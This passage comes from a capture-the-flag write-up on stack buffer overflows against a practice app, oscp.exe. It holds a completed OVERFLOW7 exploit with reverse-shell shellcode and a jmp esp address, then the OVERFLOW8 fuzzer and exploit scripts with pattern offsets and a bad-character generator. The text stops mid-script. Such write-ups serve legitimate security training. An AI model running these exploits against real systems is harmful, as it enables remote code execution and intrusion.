shellcode += "\x37\x66\x4c\x93\x0c\x0e\x9a\xc6\x37\x5e\x35"
shellcode += "\x43\x27\x5e\x25\x43\x0f\xe4\x6a\xcc\x87\xf1"
shellcode += "\xb0\x84\x0d\x0b\x0d\x19\x6c\x4f\x9a\x7b\x65"
shellcode += "\x0e\x46\x22\xee\xe8\x0f\x03\x31\x59\x0d\x8a"
shellcode += "\xc2\x7a\x04\xec\xb2\x8b\xa5\x67\x6b\xf1\x2b"
shellcode += "\x1b\x12\xe2\x0d\xe3\xd2\xac\x33\xec\xb2\x66"
shellcode += "\x06\x7e\x03\x0e\xec\xf0\x30\x59\x32\x22\x91"
shellcode += "\x64\x77\x4a\x31\xec\x98\x75\xa0\x4a\x41\x2f"
shellcode += "\x66\x0f\xe8\x57\x43\x1e\xa3\x13\x23\x5a\x35"
shellcode += "\x45\x31\x58\x23\x45\x29\x58\x33\x40\x31\x66"
shellcode += "\x1c\xdf\x58\x88\x9a\xc6\xee\xee\x2b\x45\x21"
shellcode += "\xf1\x55\x7b\x6f\x89\x78\x73\x98\xdb\xde\xf3"
shellcode += "\x7a\x24\x6f\x7b\xc1\x9b\xd8\x8e\x98\xdb\x59"
shellcode += "\x15\x1b\x04\xe5\xe8\x87\x7b\x60\xa8\x20\x1d"
shellcode += "\x17\x7c\x0d\x0e\x36\xec\xb2"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW7 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 1306 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!

![800](img/Pasted%20image%2020240903173051.png)



# Task 9 oscp.exe - OVERFLOW8

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240903180550.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW8 test" to verify.

![800](img/Pasted%20image%2020240903180623.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240903180706.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW8 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW8 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240903180946.png)


10. Fuzzing crashed at 1800 bytes. Create a pattern by adding 400 bytes, total of 2200 bytes. 

![800](img/Pasted%20image%2020240903181002.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240903181040.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 2200

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 2200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW8 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 68433568.

![800](img/Pasted%20image%2020240903181254.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 2200 -q 68433568
[*] Exact match at offset 1786
```

EIP Offset is 1786.

	Task 9
		a. What is the EIP offset for OVERFLOW8?
			1786


18. In Kali. Edit the exploit.py. Add the offset 1786 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW8 "  # The command or identifier expected by the target service
offset = 1786            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger. Note the value ESP 019BFA30.

![800](img/Pasted%20image%2020240903181636.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240903181726.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00
```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW8 "  # The command or identifier expected by the target service
offset = 1786             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
